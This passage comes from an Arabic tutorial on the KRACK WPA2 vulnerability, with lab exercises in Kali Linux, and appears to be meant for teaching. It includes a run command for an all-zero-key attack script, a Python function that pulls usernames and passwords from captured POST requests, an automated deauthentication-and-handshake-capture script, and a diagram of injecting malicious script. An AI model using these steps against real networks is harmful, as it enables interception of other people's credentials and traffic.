        print("Usage: python3 analyze_krack.py <pcap_file>")
        sys.exit(1)
    
    pcap_file = sys.argv[1]
    
    # تحليل إعادة استخدام Nonce
    analyze_nonce_reuse(pcap_file)
    
    # استخراج المصافحات
    handshakes = extract_handshakes(pcap_file)
```

### 5.6 اختبار الثغرة على Android (All-Zero Key)

هذا الاختبار خاص بأجهزة Android 6.0+ وLinux القديمة:

```bash
# تشغيل سكريبت مخصص للـ All-Zero Key attack
sudo ./krack-all-zero-tk.py \
    wlan0mon \
    TestSSID \
    --target 11:22:33:44:55:66 \
    --dump output.pcap

# مراقبة البيانات غير المشفرة
sudo tshark -r output.pcap -Y "http || dns" -T fields \
    -e ip.src -e ip.dst -e http.host -e dns.qry.name
```

**إذا نجح الهجوم، ستظهر:**
```
[✓] Client installed all-zero key!
[✓] All traffic is now in plaintext!
[*] Captured data:
    - HTTP Host: www.google.com
    - DNS Query: facebook.com
    - HTTP Cookie: sessionid=abc123...
```

---

## 6. التأثيرات الأمنية {#التأثيرات-الأمنية}

### 6.1 السيناريوهات الهجومية

#### **السيناريو 1: سرقة بيانات الاعتماد**

```
┌─────────────────────────────────────────────┐
│        هجوم سرقة كلمات المرور              │
├─────────────────────────────────────────────┤
│                                             │
│ 1. المهاجم ينفذ KRACK على ضحية            │
│ 2. الضحية تسجل دخول إلى موقع HTTP          │
│ 3. المهاجم يفك تشفير الطلبات               │
│ 4. استخراج:                                │
│    • اسم المستخدم                           │
│    • كلمة المرور                            │
│    • Session Cookies                       │
│    • API Keys                              │
│                                             │
│ النتيجة: اختراق حسابات المستخدم            │
└─────────────────────────────────────────────┘
```

**مثال التقاط بيانات تسجيل الدخول:**

```python
def extract_credentials(pcap_file):
    """استخراج بيانات تسجيل الدخول من PCAP"""
    packets = rdpcap(pcap_file)
    
    for pkt in packets:
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            
            # البحث عن POST requests
            if 'POST' in payload:
                print("[+] Found POST request:")
                
                # استخراج بيانات النموذج
                if 'username=' in payload or 'password=' in payload:
                    print("    [!] Credentials detected:")
                    print(f"        {payload}")
```

#### **السيناريو 2: حقن البرمجيات الخبيثة**

```
Attack Flow:
═══════════════════════════════════════════════

1. KRACK Attack → فك تشفير الاتصال

2. MitM Position → التحكم في البيانات

3. HTTP Injection:
   • الضحية يطلب: http://example.com/page.html
   • المهاجم يعدل الاستجابة:
     - إضافة <script src="evil.js"></script>
     - تضمين malware payload
   
4. Drive-by Download:
   • تحميل تلقائي لـ malware
   • استغلال ثغرات المتصفح
   • تثبيت backdoor

النتيجة: اختراق كامل للجهاز
═══════════════════════════════════════════════
```

#### **السيناريو 3: استهداف الشبكات المؤسسية**

```
Corporate Network Attack:

┌────────────────────────────────────────────┐
│          Enterprise Network                │
│                                            │
│  [WiFi AP] ←KRACK← [Attacker]             │
│      ↓                                     │
│  [Employee Laptop] (Victim)                │
│      ↓                                     │
│  • VPN credentials captured                │
│  • Internal network map obtained           │
│  • Email intercepted                       │
│  • Corporate documents leaked              │
│      ↓                                     │
│  [Internal Servers] ← Lateral Movement    │
│                                            │
└────────────────────────────────────────────┘

التأثير:
• تسريب بيانات حساسة
• انتهاك GDPR/compliance
• خسائر مالية ضخمة
• أضرار بالسمعة
```

### 6.2 تقييم الخطورة (CVSS Scoring)

```
CVSS v3.0 لـ CVE-2017-13077:
═══════════════════════════════════════

Attack Vector (AV): Adjacent Network (A)
Attack Complexity (AC): High (H)
Privileges Required (PR): None (N)
User Interaction (UI): None (N)
Scope (S): Unchanged (U)
Confidentiality (C): High (H)
Integrity (I): High (H)
Availability (A): None (N)

CVSS Base Score: 8.1 (HIGH)
CVSS Vector: CVSS:3.0/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N

═══════════════════════════════════════
```

### 6.3 الفئات المستهدفة الأكثر خطورة

| الفئة | مستوى الخطر | السبب |
|-------|-------------|--------|
| **أجهزة Android القديمة** | 🔴 خطر شديد | ثغرة All-Zero Key |
| **أجهزة IoT** | 🔴 خطر شديد | نادراً ما تُحدث |
| **Embedded Systems** | 🟠 خطر عالي | صعوبة التحديث |
| **الشبكات المؤسسية** | 🟠 خطر عالي | بيانات حساسة |
| **الأنظمة الطبية** | 🔴 خطر شديد | سلامة المرضى |
| **المركبات المتصلة** | 🟠 خطر عالي | أنظمة التحكم |

---

# الجزء التطبيقي: تمارين عملية في Kali Linux
## دليل شامل لفهم واختبار هجوم KRACK

---

## 📋 فهرس التمارين

1. [إعداد بيئة المختبر الافتراضية](#تمرين-1-إعداد-بيئة-المختبر)
2. [التعرف على أدوات Kali Linux للشبكات اللاسلكية](#تمرين-2-أدوات-kali-linux)
3. [تحليل المصافحة الرباعية WPA2](#تمرين-3-تحليل-المصافحة)
4. [بناء سكريبت استماع متقدم](#تمرين-4-سكريبت-الاستماع)
5. [محاكاة هجوم KRACK المحكوم](#تمرين-5-محاكاة-krack)
6. [تحليل حركة المرور بعد الهجوم](#تمرين-6-تحليل-البيانات)
7. [اختبار الأجهزة المختلفة للثغرة](#تمرين-7-اختبار-الأجهزة)
8. [بناء نظام كشف KRACK](#تمرين-8-نظام-الكشف)

---

## التمرين 1: إعداد بيئة المختبر الافتراضية {#تمرين-1-إعداد-بيئة-المختبر}

### الهدف
بناء بيئة اختبار آمنة ومعزولة لتنفيذ تمارين KRACK دون التأثير على الشبكات الحقيقية.

### المتطلبات

```
Hardware Requirements:
┌─────────────────────────────────────────┐
│ • CPU: 4 cores minimum (Intel VT-x/    │
│   AMD-V enabled)                        │
│ • RAM: 8GB minimum (16GB recommended)   │
│ • Storage: 50GB free space              │
│ • WiFi: 2x USB WiFi adapters           │
│   - Adapter 1: للـ AP                   │
│   - Adapter 2: للعميل/المراقبة          │
└─────────────────────────────────────────┘

Software Requirements:
┌─────────────────────────────────────────┐
│ • VirtualBox 7.0+ أو VMware Workstation │
│ • Kali Linux 2024.1 ISO                 │
│ • Ubuntu 22.04 LTS (للعميل)            │
│ • USB WiFi drivers للـ host            │
└─────────────────────────────────────────┘
```

### الخطوات العملية

#### الخطوة 1.1: تثبيت وإعداد VirtualBox

```bash
# على نظام Linux Host
sudo apt update
sudo apt install virtualbox virtualbox-ext-pack -y

# التحقق من التثبيت
vboxmanage --version

# تفعيل USB support
sudo usermod -aG vboxusers $USER
# يجب إعادة تسجيل الدخول بعد هذا الأمر
```

#### الخطوة 1.2: إنشاء VM لـ Kali Linux

```bash
# إنشاء VM جديد
VBoxManage createvm --name "Kali-KRACK-Lab" --ostype "Debian_64" --register

# تخصيص الموارد
VBoxManage modifyvm "Kali-KRACK-Lab" \
    --memory 4096 \
    --cpus 2 \
    --vram 128 \
    --nic1 nat \
    --nic2 hostonly \
    --hostonlyadapter2 vboxnet0

# إنشاء قرص صلب افتراضي
VBoxManage createhd --filename ~/VMs/Kali-KRACK-Lab.vdi --size 50000

# ربط القرص الصلب
VBoxManage storagectl "Kali-KRACK-Lab" --name "SATA Controller" --add sata
VBoxManage storageattach "Kali-KRACK-Lab" \
    --storagectl "SATA Controller" \
    --port 0 \
    --device 0 \
    --type hdd \
    --medium ~/VMs/Kali-KRACK-Lab.vdi

# ربط ISO للتثبيت
VBoxManage storageattach "Kali-KRACK-Lab" \
    --storagectl "SATA Controller" \
    --port 1 \
    --device 0 \
    --type dvddrive \
    --medium ~/Downloads/kali-linux-2024.1-installer-amd64.iso
```

#### الخطوة 1.3: إعداد شبكة Host-Only

```bash
# إنشاء شبكة Host-Only
VBoxManage hostonlyif create

# تكوين الشبكة
VBoxManage hostonlyif ipconfig vboxnet0 \
    --ip 192.168.56.1 \
    --netmask 255.255.255.0

# تفعيل DHCP server
VBoxManage dhcpserver add \
    --ifname vboxnet0 \
    --ip 192.168.56.1 \
    --netmask 255.255.255.0 \
    --lowerip 192.168.56.100 \
    --upperip 192.168.56.200 \
    --enable
```

#### الخطوة 1.4: تثبيت Kali Linux

```bash
# تشغيل VM للتثبيت
VBoxManage startvm "Kali-KRACK-Lab"

# بعد التثبيت، داخل Kali VM:
sudo apt update && sudo apt full-upgrade -y
sudo apt install -y virtualbox-guest-x11
sudo reboot
```

#### الخطوة 1.5: إعداد USB WiFi Adapters

```bash
# على Host Machine - التحقق من USB devices
lsusb | grep -i wireless

# مثال للمخرجات:
# Bus 001 Device 005: ID 0bda:8187 Realtek RTL8187 Wireless Adapter

# في VirtualBox، إضافة USB filter
VBoxManage usbfilter add 0 \
    --target "Kali-KRACK-Lab" \
    --name "Alfa AWUS036NHA" \
    --vendorid 0x0bda \
    --productid 0x8187

# داخل Kali VM - التحقق من الكرت
sudo airmon-ng

# المخرجات المتوقعة:
# PHY     Interface    Driver          Chipset
# phy0    wlan0        rtl8187         Realtek RTL8187
```

### التمرين العملي 1.1: اختبار البيئة

```bash
#!/bin/bash
# test_environment.sh - سكريبت اختبار البيئة

echo "═══════════════════════════════════════════"
echo "  KRACK Lab Environment Test"
echo "═══════════════════════════════════════════"

# اختبار 1: التحقق من الشبكة
echo -e "\n[TEST 1] Network Connectivity"
if ping -c 2 8.8.8.8 &> /dev/null; then
    echo "✓ Internet connection: OK"
else
    echo "✗ Internet connection: FAILED"
fi

# اختبار 2: التحقق من USB WiFi
echo -e "\n[TEST 2] WiFi Adapters"
WIFI_COUNT=$(iwconfig 2>/dev/null | grep -c "IEEE 802.11")
if [ $WIFI_COUNT -ge 2 ]; then
    echo "✓ WiFi adapters: $WIFI_COUNT found (OK)"
    iwconfig 2>/dev/null | grep "IEEE 802.11"
else
    echo "✗ WiFi adapters: Only $WIFI_COUNT found (Need 2+)"
fi

# اختبار 3: التحقق من الأدوات
echo -e "\n[TEST 3] Required Tools"
TOOLS=("aircrack-ng" "hostapd" "wireshark" "python3" "scapy")
for tool in "${TOOLS[@]}"; do
    if command -v $tool &> /dev/null; then
        echo "✓ $tool: Installed"
    else
        echo "✗ $tool: NOT FOUND"
    fi
done

# اختبار 4: التحقق من Monitor Mode
echo -e "\n[TEST 4] Monitor Mode Capability"
sudo airmon-ng check kill &> /dev/null
sudo airmon-ng start wlan0 &> /dev/null

if iwconfig 2>/dev/null | grep -q "Mode:Monitor"; then
    echo "✓ Monitor mode: SUPPORTED"
    sudo airmon-ng stop wlan0mon &> /dev/null
else
    echo "✗ Monitor mode: NOT SUPPORTED"
fi

echo -e "\n═══════════════════════════════════════════"
echo "  Test Complete!"
echo "═══════════════════════════════════════════"
```

**تشغيل الاختبار:**

```bash
chmod +x test_environment.sh
sudo ./test_environment.sh
```

---

## التمرين 2: التعرف على أدوات Kali Linux للشبكات اللاسلكية {#تمرين-2-أدوات-kali-linux}

### الهدف
إتقان استخدام الأدوات الأساسية لتحليل وهجوم الشبكات اللاسلكية.

### 2.1 أداة aircrack-ng suite

#### التمرين 2.1.1: استكشاف الشبكات

```bash
# الخطوة 1: تفعيل Monitor Mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# الخطوة 2: فحص الشبكات المحيطة
sudo airodump-ng wlan0mon

# ستظهر نتائج مثل:
# BSSID              PWR  Beacons  #Data  CH   MB   ENC  CIPHER AUTH ESSID
# AA:BB:CC:DD:EE:FF  -42      156     89   6  270   WPA2 CCMP   PSK  TestNetwork
# 11:22:33:44:55:66  -67       45     12  11  130   WPA2 CCMP   PSK  HomeWiFi

# الخطوة 3: التركيز على شبكة معينة
sudo airodump-ng \
    --bssid AA:BB:CC:DD:EE:FF \
    --channel 6 \
    --write capture-test \
    wlan0mon
```

**شرح الأعمدة:**

```
┌─────────────────────────────────────────────────────┐
│ PWR (Power):       قوة الإشارة بالـ dBm             │
│ Beacons:           عدد إطارات Beacon المستقبلة      │
│ #Data:             عدد إطارات البيانات              │
│ CH (Channel):      القناة المستخدمة                 │
│ MB (Mbps):         السرعة القصوى                    │
│ ENC (Encryption):  نوع التشفير                      │
│ CIPHER:            خوارزمية التشفير                  │
│ AUTH:              طريقة المصادقة                    │
│ ESSID:             اسم الشبكة                       │
└─────────────────────────────────────────────────────┘
```

#### التمرين 2.1.2: التقاط المصافحة الرباعية

```bash
# في نافذة طرفية 1: المراقبة والتقاط
sudo airodump-ng \
    --bssid AA:BB:CC:DD:EE:FF \
    --channel 6 \
    --write handshake-capture \
    wlan0mon

# في نافذة طرفية 2: Deauthentication لإجبار إعادة الاتصال
# انتظر لرؤية عميل متصل، ثم:
sudo aireplay-ng \
    --deauth 5 \
    -a AA:BB:CC:DD:EE:FF \
    -c 11:22:33:44:55:66 \
    wlan0mon

# في النافذة الأولى، ستظهر رسالة:
# WPA handshake: AA:BB:CC:DD:EE:FF
```

**سكريبت أوتوماتيكي للالتقاط:**

```bash
#!/bin/bash
# auto_capture_handshake.sh

TARGET_BSSID="AA:BB:CC:DD:EE:FF"
CHANNEL=6
OUTPUT_PREFIX="handshake"
INTERFACE="wlan0mon"

echo "[*] Starting handshake capture for $TARGET_BSSID"

# بدء الالتقاط في الخلفية
sudo airodump-ng \
    --bssid $TARGET_BSSID \
    --channel $CHANNEL \
    --write $OUTPUT_PREFIX \
    $INTERFACE &

AIRODUMP_PID=$!

echo "[*] Waiting for clients to appear..."
sleep 10

# الحصول على قائمة العملاء
CLIENTS=$(sudo airodump-ng \
    --bssid $TARGET_BSSID \
    --channel $CHANNEL \
    $INTERFACE \
    --output-format csv \
    -w temp 2>/dev/null | \
    grep "$TARGET_BSSID" | \
    awk -F, '{print $1}' | \
    grep -v "$TARGET_BSSID")

if [ -z "$CLIENTS" ]; then
    echo "[-] No clients found!"
    kill $AIRODUMP_PID
    exit 1
fi

echo "[+] Found clients:"
echo "$CLIENTS"

# Deauth لكل عميل
for CLIENT in $CLIENTS; do
    echo "[*] Deauthing $CLIENT"
    sudo aireplay-ng \
        --deauth 3 \
        -a $TARGET_BSSID \
        -c $CLIENT \
        $INTERFACE
    sleep 2
done

echo "[*] Waiting for handshake capture..."
sleep 10

# التحقق من التقاط المصافحة
if sudo aircrack-ng ${OUTPUT_PREFIX}-01.cap | grep -q "1 handshake"; then
    echo "[✓] Handshake captured successfully!"
    echo "[*] Saved to: ${OUTPUT_PREFIX}-01.cap"
else
    echo "[-] No handshake captured. Try again."
fi

# إيقاف airodump-ng
kill $AIRODUMP_PID

rm -f temp-*.csv temp-*.cap temp-*.kismet.*
```

### 2.2 أداة Wireshark لتحليل الحزم

#### التمرين 2.2.1: تحليل EAPOL Frames

```bash
# فتح ملف الالتقاط
wireshark handshake-capture-01.cap

# في Wireshark، طبق الفلتر:
eapol
```

**تحليل تفصيلي للرسائل الأربع:**

```
Display Filters المفيدة:
┌──────────────────────────────────────────────────┐
│ eapol && wlan.addr == AA:BB:CC:DD:EE:FF          │
│   → عرض جميع رسائل EAPOL للـ AP                 │
│                                                  │
│ eapol.type == 3                                  │
│   → رسائل المفاتيح فقط                          │
│                                                  │
│ wlan.fc.type_subtype == 0x0008                   │
│   → Beacon frames                                │
│                                                  │
│ wlan.fc.type_subtype == 0x000c                   │
│   → Deauthentication frames                      │
│                                                  │
│ wlan.ccmp.extiv                                  │
│   → البيانات المشفرة بـ CCMP                     │
└──────────────────────────────────────────────────┘
```

**سكريبت Python لاستخراج معلومات المصافحة:**

```python
#!/usr/bin/env python3
"""
extract_handshake_info.py - استخراج تفاصيل المصافحة
"""

from scapy.all import *
import sys

def analyze_handshake(pcap_file):
    """تحليل ملف PCAP لاستخراج معلومات المصافحة"""
    
    print("═" * 60)
    print("  WPA2 4-Way Handshake Analyzer")
    print("═" * 60)
    
    packets = rdpcap(pcap_file)
    eapol_packets = [pkt for pkt in packets if pkt.haslayer(EAPOL)]
    
    if len(eapol_packets) < 4:
        print(f"[-] Only {len(eapol_packets)} EAPOL packets found!")
        print("[-] Complete handshake requires 4 packets")
        return
    
    print(f"\n[+] Found {len(eapol_packets)} EAPOL packets")
    print("\nDetailed Analysis:\n")
    
    for i, pkt in enumerate(eapol_packets[:4], 1):
        print(f"{'─' * 60}")
        print(f"Message {i}:")
        print(f"{'─' * 60}")
        
        # معلومات الطبقة الفيزيائية
        if pkt.haslayer(Dot11):
            dot11 = pkt[Dot11]
            print(f"  Direction: {dot11.addr2} → {dot11.addr1}")
            
        # معلومات EAPOL
        if pkt.haslayer(EAPOL):
            eapol = pkt[EAPOL]
            
            # استخراج Key Information
            if hasattr(eapol, 'key_info'):
                key_info = eapol.key_info
                print(f"  Key Info: 0x{key_info:04x}")
                
                # تحليل الـ flags
                flags = {
                    'Key Type': 'Pairwise' if (key_info & 0x0008) else 'Group',
                    'Install': bool(key_info & 0x0040),
                    'Key ACK': bool(key_info & 0x0080),
                    'Key MIC': bool(key_info & 0x0100),
                    'Secure': bool(key_info & 0x0200),
                    'Error': bool(key_info & 0x0400),
                    'Request': bool(key_info & 0x0800),
                    'Encrypted': bool(key_info & 0x1000),
                }
                
                for flag, value in flags.items():
                    print(f"    • {flag}: {value}")
            
            # Key Replay Counter
            if hasattr(eapol, 'replay_counter'):
                print(f"  Replay Counter: {eapol.replay_counter}")
            
            # Nonce (إذا موجود)
            if hasattr(eapol, 'nonce'):
                nonce_hex = eapol.nonce.hex()[:32]
                print(f"  Nonce: {nonce_hex}...")
        
        print()
    
    # التحقق من اكتمال المصافحة
    print(f"{'═' * 60}")
    if len(eapol_packets) >= 4:
        print("[✓] Complete 4-way handshake captured!")
    else:
        print("[-] Incomplete handshake")
    print(f"{'═' * 60}")

def extract_nonces(pcap_file):
    """استخراج ANonce و SNonce"""
    
    packets = rdpcap(pcap_file)
    
    anonce = None
    snonce = None
    
    for pkt in packets:
        if pkt.haslayer(EAPOL):
            eapol = pkt[EAPOL]
            
            if hasattr(eapol, 'nonce') and hasattr(eapol, 'key_info'):
                key_info = eapol.key_info
                
                # Message 1: ANonce (Key ACK = 1, Key MIC = 0)
                if (key_info & 0x0080) and not (key_info & 0x0100):
                    anonce = eapol.nonce
                    print(f"[+] ANonce: {anonce.hex()}")
                
                # Message 2: SNonce (Key MIC = 1, NO Key ACK)
                elif (key_info & 0x0100) and not (key_info & 0x0080):
                    snonce = eapol.nonce
                    print(f"[+] SNonce: {snonce.hex()}")
    
    return anonce, snonce

def check_krack_vulnerability(pcap_file):
    """فحص ملف PCAP لعلامات هجوم KRACK"""
    
    print("\n" + "═" * 60)
    print("  KRACK Vulnerability Check")
    print("═" * 60 + "\n")
    
    packets = rdpcap(pcap_file)
    eapol_packets = [pkt for pkt in packets if pkt.haslayer(EAPOL)]
    
    # البحث عن إعادة إرسال Message 3
    msg3_count = 0
    replay_counters = []
    
    for pkt in eapol_packets:
        if pkt.haslayer(EAPOL):
            eapol = pkt[EAPOL]
            
            if hasattr(eapol, 'key_info'):
                key_info = eapol.key_info
                
                # Message 3: Install=1, Key ACK=1, Key MIC=1
                if (key_info & 0x01C0) == 0x01C0:
                    msg3_count += 1
                    if hasattr(eapol, 'replay_counter'):
                        replay_counters.append(eapol.replay_counter)
    
    print(f"[*] Message 3 count: {msg3_count}")
    
    if msg3_count > 1:
        print("[!] Multiple Message 3 detected!")
        print("[!] Possible KRACK attack attempt!")
        
        # التحقق من Replay Counters
        if len(set(replay_counters)) < len(replay_counters):
            print("[✓] Duplicate replay counters detected!")
            print("[✓] Definite KRACK attack signature!")
        else:
            print("[*] Replay counters are unique")
            print("[*] Might be legitimate retransmission")
    else:
        print("[✓] Normal handshake - no KRACK detected")
    
    print("\n" + "═" * 60)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 extract_handshake_info.py <pcap_file>")
        sys.exit(1)
    
    pcap_file = sys.argv[1]
    
    # تحليل المصافحة
    analyze_handshake(pcap_file)
    
    # استخراج Nonces
    print("\nNonce Extraction:")
    print("─" * 60)
    extract_nonces(pcap_file)
    
    # فحص KRACK
    check_krack_vulnerability(pcap_file)
```

**استخدام السكريبت:**

```bash
chmod +x extract_handshake_info.py
python3 extract_handshake_info.py handshake-capture-01.cap
```

### 2.3 أداة hostapd لإنشاء Access Point

#### التمرين 2.3.1: إنشاء AP اختبار

```bash
# إنشاء ملف التكوين
sudo nano /tmp/hostapd-test.conf
```

**محتوى الملف:**

```ini
# واجهة الشبكة
interface=wlan1
driver=nl80211

# معلومات الشبكة
ssid=KRACK-Lab-AP
hw_mode=g
channel=6
country_code=US

# إعدادات WPA2
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase=KrackTest2024
wpa_pairwise=CCMP
rsn_pairwise=CCMP

# IEEE 802.11w (لاختبار IGTK)
ieee80211w=1
group_mgmt_cipher=AES-128-CMAC

# إعدادات إضافية
beacon_int=100
dtim_period=2
max_num_sta=10

# Logging
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
ctrl_interface=/var/run/hostapd
ctrl_interface_group=0

# Debug (للتطوير فقط)
#debug=4
#dump_file=/tmp/hostapd-dump
```

**تشغيل AP:**

```bash
# إيقاف Network Manager
sudo systemctl stop NetworkManager

# تشغيل hostapd
sudo hostapd /tmp/hostapd-test.conf

# في نافذة أخرى - إعداد DHCP
sudo ip addr add 192.168.100.1/24 dev wlan1
sudo ip link set wlan1 up

# تشغيل dnsmasq للـ DHCP
sudo dnsmasq \
    --interface=wlan1 \
    --bind-interfaces \
    --dhcp-range=192.168.100.10,192.168.100.100,12h \
    --no-daemon
```

**سكريبت أوتوماتيكي للـ AP:**

```bash
#!/bin/bash
# setup_test_ap.sh

INTERFACE="wlan1"
SSID="KRACK-Lab-AP"
PASSWORD="KrackTest2024"
CHANNEL=6
IP_RANGE="192.168.100"

echo "[*] Setting up test Access Point"

# إيقاف الخدمات المتداخلة
sudo systemctl stop NetworkManager
sudo killall wpa_supplicant dnsmasq hostapd 2>/dev/null

# إنشاء ملف hostapd مؤقت
cat > /tmp/hostapd-auto.conf <<EOF
interface=$INTERFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
wpa=2
wpa_passphrase=$PASSWORD
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
ieee80211w=1
logger_stdout=-1
logger_stdout_level=2
EOF

# تكوين الواجهة
sudo ip addr flush dev $INTERFACE
sudo ip addr add ${IP_RANGE}.1/24 dev $INTERFACE
sudo ip link set $INTERFACE up

# بدء hostapd في الخلفية
sudo hostapd /tmp/hostapd-auto.conf &
HOSTAPD_PID=$!

sleep 3

# بدء DHCP server
sudo dnsmasq \
    --interface=$INTERFACE \
    --bind-interfaces \
    --dhcp-range=${IP_RANGE}.10,${IP_RANGE}.100,12h \
    --dhcp-option=3,${IP_RANGE}.1 \
    --dhcp-option=6,8.8.8.8,8.8.4.4 \
    --no-daemon &
DNSMASQ_PID=$!

echo "[✓] Access Point started!"
echo "    SSID: $SSID"
echo "    Password: $PASSWORD"
echo "    Channel: $CHANNEL"
echo "    IP Range: ${IP_RANGE}.0/24"
echo ""
echo "Press Ctrl+C to stop..."

# معالج إيقاف نظيف
trap "sudo kill $HOSTAPD_PID $DNSMASQ_PID 2>/dev/null; exit" INT TERM

# انتظار
wait
```

---

## التمرين 3: تحليل المصافحة الرباعية بالتفصيل {#تمرين-3-تحليل-المصافحة}

### الهدف
فهم عميق لهيكل كل رسالة في المصافحة الرباعية وكيفية استخراج المعلومات منها.

### 3.1 بناء محلل مصافحة متقدم

```python
#!/usr/bin/env python3
"""
advanced_handshake_analyzer.py - محلل شامل للمصافحة الرباعية
"""

from scapy.all import *
from Crypto.Hash import HMAC, SHA1
from Crypto.Cipher import AES
import struct
import binascii

class WPA2HandshakeAnalyzer:
    """محلل متقدم لمصافحة WPA2"""
    
    def __init__(self, pcap_file):
        self.pcap_file = pcap_file
        self.packets = rdpcap(pcap_file)
        self.handshake_packets = []
        self.ap_mac = None
        self.client_mac = None
        self.anonce = None
        self.snonce = None
        self.mic = None
        self.eapol_frames = []
        
    def extract_handshake(self):
        """استخراج حزم المصافحة"""
        
        print("[*] Extracting 4-way handshake packets...")
        
        for pkt in self.packets:
            if pkt.haslayer(EAPOL):
                self.eapol_frames.append(pkt)
                
                # استخراج MAC addresses
                if pkt.haslayer(Dot11):
                    if self.ap_mac is None:
                        self.ap_mac = pkt.addr2
                    if self.client_mac is None and pkt.addr1 != self.ap_mac:

                        self.client_mac = pkt.addr1
        
        if len(self.eapol_frames) >= 4:
            self.handshake_packets = self.eapol_frames[:4]
            print(f"[✓] Found complete handshake with {len(self.eapol_frames)} EAPOL frames")
            print(f"    AP MAC: {self.ap_mac}")
            print(f"    Client MAC: {self.client_mac}")
            return True
        else:
            print(f"[-] Incomplete handshake: only {len(self.eapol_frames)} frames")
            return False
    
    def parse_eapol_key_frame(self, pkt):
        """تحليل تفصيلي لإطار EAPOL"""
        
        if not pkt.haslayer(EAPOL):
            return None
        
        eapol = pkt[EAPOL]
        raw_eapol = bytes(eapol)
        
        # هيكل EAPOL Key Frame
        frame_info = {
            'version': raw_eapol[0],
            'type': raw_eapol[1],
            'length': struct.unpack('>H', raw_eapol[2:4])[0],
            'descriptor_type': raw_eapol[4],
            'key_info': struct.unpack('>H', raw_eapol[5:7])[0],
            'key_length': struct.unpack('>H', raw_eapol[7:9])[0],
            'replay_counter': struct.unpack('>Q', raw_eapol[9:17])[0],
            'nonce': raw_eapol[17:49],
            'key_iv': raw_eapol[49:65],
            'key_rsc': struct.unpack('>Q', raw_eapol[65:73])[0],
            'key_id': struct.unpack('>Q', raw_eapol[73:81])[0],
            'mic': raw_eapol[81:97],
            'key_data_length': struct.unpack('>H', raw_eapol[97:99])[0],
        }
        
        # Key Data (إذا موجود)
        if frame_info['key_data_length'] > 0:
            frame_info['key_data'] = raw_eapol[99:99+frame_info['key_data_length']]
        
        return frame_info
    
    def decode_key_info(self, key_info):
        """فك تشفير حقل Key Information"""
        
        return {
            'Key Descriptor Version': (key_info & 0x0007),
            'Key Type': 'Pairwise' if (key_info & 0x0008) else 'Group',
            'Key Index': (key_info & 0x0030) >> 4,
            'Install': bool(key_info & 0x0040),
            'Key ACK': bool(key_info & 0x0080),
            'Key MIC': bool(key_info & 0x0100),
            'Secure': bool(key_info & 0x0200),
            'Error': bool(key_info & 0x0400),
            'Request': bool(key_info & 0x0800),
            'Encrypted Key Data': bool(key_info & 0x1000),
            'SMK Message': bool(key_info & 0x2000),
        }
    
    def identify_message_number(self, frame_info):
        """تحديد رقم الرسالة في المصافحة"""
        
        key_info = frame_info['key_info']
        flags = self.decode_key_info(key_info)
        
        # Message 1: Key ACK=1, Key MIC=0, Install=0
        if flags['Key ACK'] and not flags['Key MIC'] and not flags['Install']:
            return 1
        
        # Message 2: Key ACK=0, Key MIC=1, Install=0
        elif not flags['Key ACK'] and flags['Key MIC'] and not flags['Install']:
            return 2
        
        # Message 3: Key ACK=1, Key MIC=1, Install=1, Secure=1
        elif flags['Key ACK'] and flags['Key MIC'] and flags['Install'] and flags['Secure']:
            return 3
        
        # Message 4: Key ACK=0, Key MIC=1, Secure=1, Install=0
        elif not flags['Key ACK'] and flags['Key MIC'] and flags['Secure'] and not flags['Install']:
            return 4
        
        return 0  # Unknown
    
    def analyze_full_handshake(self):
        """تحليل كامل للمصافحة الرباعية"""
        
        if not self.extract_handshake():
            return
        
        print("\n" + "═" * 70)
        print("  DETAILED 4-WAY HANDSHAKE ANALYSIS")
        print("═" * 70 + "\n")
        
        for i, pkt in enumerate(self.handshake_packets, 1):
            frame_info = self.parse_eapol_key_frame(pkt)
            if not frame_info:
                continue
            
            msg_num = self.identify_message_number(frame_info)
            key_info_flags = self.decode_key_info(frame_info['key_info'])
            
            print(f"{'─' * 70}")
            print(f"  Message {msg_num} (Packet #{i})")
            print(f"{'─' * 70}")
            
            # معلومات أساسية
            print(f"  EAPOL Version: {frame_info['version']}")
            print(f"  Type: {frame_info['type']} (Key)")
            print(f"  Length: {frame_info['length']} bytes")
            print(f"  Descriptor Type: {frame_info['descriptor_type']} (EAPOL WPA Key)")
            
            # Key Information Flags
            print(f"\n  Key Information: 0x{frame_info['key_info']:04x}")
            for flag, value in key_info_flags.items():
                status = "✓" if value else "✗"
                print(f"    {status} {flag}: {value}")
            
            # معلومات إضافية
            print(f"\n  Key Length: {frame_info['key_length']}")
            print(f"  Replay Counter: {frame_info['replay_counter']}")
            print(f"  Key RSC: {frame_info['key_rsc']}")
            
            # Nonce
            if any(frame_info['nonce']):  # إذا لم يكن صفري
                nonce_hex = binascii.hexlify(frame_info['nonce']).decode()
                print(f"  Nonce: {nonce_hex[:32]}...")
                
                # حفظ Nonces
                if msg_num == 1:
                    self.anonce = frame_info['nonce']
                    print(f"    → This is ANonce (from AP)")
                elif msg_num == 2:
                    self.snonce = frame_info['nonce']
                    print(f"    → This is SNonce (from Client)")
            
            # Key IV
            if any(frame_info['key_iv']):
                key_iv_hex = binascii.hexlify(frame_info['key_iv']).decode()
                print(f"  Key IV: {key_iv_hex}")
            
            # MIC
            if any(frame_info['mic']):
                mic_hex = binascii.hexlify(frame_info['mic']).decode()
                print(f"  MIC: {mic_hex}")
                
                if msg_num == 2:
                    self.mic = frame_info['mic']
            
            # Key Data
            if frame_info['key_data_length'] > 0:
                print(f"\n  Key Data Length: {frame_info['key_data_length']} bytes")
                
                if msg_num == 3:
                    print(f"    → Contains GTK (Group Temporal Key)")
                    
                    # محاولة فك تشفير GTK (يحتاج PTK)
                    if key_info_flags['Encrypted Key Data']:
                        print(f"    → GTK is encrypted with KEK")
            
            print()
        
        print("═" * 70)
        
        # ملخص النتائج
        self.print_summary()
    
    def print_summary(self):
        """طباعة ملخص التحليل"""
        
        print("\n" + "╔" + "═" * 68 + "╗")
        print("║" + " " * 25 + "ANALYSIS SUMMARY" + " " * 27 + "║")
        print("╠" + "═" * 68 + "╣")
        
        print(f"║  AP MAC Address:        {self.ap_mac or 'N/A':<40} ║")
